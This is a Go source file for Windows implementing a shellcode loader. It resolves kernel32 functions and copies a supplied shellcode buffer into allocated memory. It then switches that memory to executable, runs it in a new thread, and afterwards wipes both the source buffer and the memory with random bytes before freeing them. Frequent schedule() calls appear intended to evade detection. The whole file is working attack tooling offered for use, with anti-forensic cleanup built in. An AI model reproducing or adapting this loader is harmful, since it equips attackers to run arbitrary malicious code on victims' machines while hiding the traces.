// +build windows

package shellcode

import (
	"sync"
	"syscall"
	"unsafe"

	"github.com/pkg/errors"

	"project/internal/random"
)

var (
	initFindProcVirtualProtectOnce sync.Once

	vpVirtualAlloc        *syscall.Proc
	vpVirtualProtect      *syscall.Proc
	vpCreateThread        *syscall.Proc
	vpWaitForSingleObject *syscall.Proc
	vpVirtualFree         *syscall.Proc

	initVirtualProtectErr error
)

func initFindProcVirtualProtect() {
	schedule()
	var kernel32 *syscall.DLL
	kernel32, initVirtualProtectErr = syscall.LoadDLL("kernel32.dll")
	if initVirtualProtectErr != nil {
		return
	}

	procMap := [5]*struct {
		proc **syscall.Proc
		name string
	}{
		{
			&vpVirtualAlloc,
			"VirtualAlloc",
		},
		{
			&vpVirtualProtect,
			"VirtualProtect",
		},
		{
			&vpCreateThread,
			"CreateThread",
		},
		{
			&vpWaitForSingleObject,
			"WaitForSingleObject",
		},
		{
			&vpVirtualFree,
			"VirtualFree",
		},
	}

	for i := 0; i < 5; i++ {
		schedule()
		proc, err := kernel32.FindProc(procMap[i].name)
		if err != nil {
			initVirtualProtectErr = err
			return
		}
		schedule()
		*procMap[i].proc = proc
	}
}

// VirtualProtect is used to use virtual protect to execute
// shellcode, it will block until shellcode exit, so usually
// need create a goroutine to execute VirtualProtect
func VirtualProtect(shellcode []byte) error {
	l := len(shellcode)
	if l == 0 {
		return errors.New("no data")
	}

	initFindProcVirtualProtectOnce.Do(initFindProcVirtualProtect)
	if initVirtualProtectErr != nil {
		return errors.WithStack(initVirtualProtectErr)
	}

	// allocate memory
	// https://docs.microsoft.com/zh-cn/windows/win32/memory/memory-protection-constants
	const (
		memCommit     = uintptr(0x1000)
		memReserve    = uintptr(0x2000)
		pageReadWrite = uintptr(0x04)
		pageExecute   = uintptr(0x10)
		memRelease    = uintptr(0x8000)
	)
	schedule()
	memAddr, _, err := vpVirtualAlloc.Call(0, uintptr(l),
		memReserve|memCommit, pageReadWrite)
	if memAddr == 0 {
		return errors.WithStack(err)
	}

	// copy shellcode
	rand := random.New(0)
	count := 0
	for i := 0; i < l; i++ {
		if count > 32 {
			schedule()
			count = 0
		} else {
			count += 1
		}
		// set shellcode
		b := (*byte)(unsafe.Pointer(memAddr + uintptr(i)))
		*b = shellcode[i]

		// clean shellcode
		shellcode[i] = byte(rand.Int64())
	}

	// set execute
	schedule()
	var run uintptr
	ok, _, err := vpVirtualProtect.Call(memAddr, uintptr(l),
		pageExecute, uintptr(unsafe.Pointer(&run)))
	if ok == 0 {
		return errors.WithStack(err)
	}

	// execute shellcode
	schedule()
	threadAddr, _, err := vpCreateThread.Call(0, 0, memAddr, 0, 0, 0)
	if threadAddr == 0 {
		return errors.WithStack(err)
	}
	schedule()
	_, _, _ = vpWaitForSingleObject.Call(threadAddr, 0xFFFFFFFF)

	// set read write
	schedule()
	ok, _, err = vpVirtualProtect.Call(memAddr, uintptr(l),
		pageReadWrite, uintptr(unsafe.Pointer(&run)))
	if ok == 0 {
		return errors.WithStack(err)
	}

	// cover shellcode and free allocated memory
	schedule()
	rand = random.New(0)
	for i := 0; i < l; i++ {
		b := (*byte)(unsafe.Pointer(memAddr + uintptr(i)))
		*b = byte(rand.Int64())
	}
	_, _, _ = vpVirtualFree.Call(memAddr, 0, memRelease)

	schedule()
	return nil
}
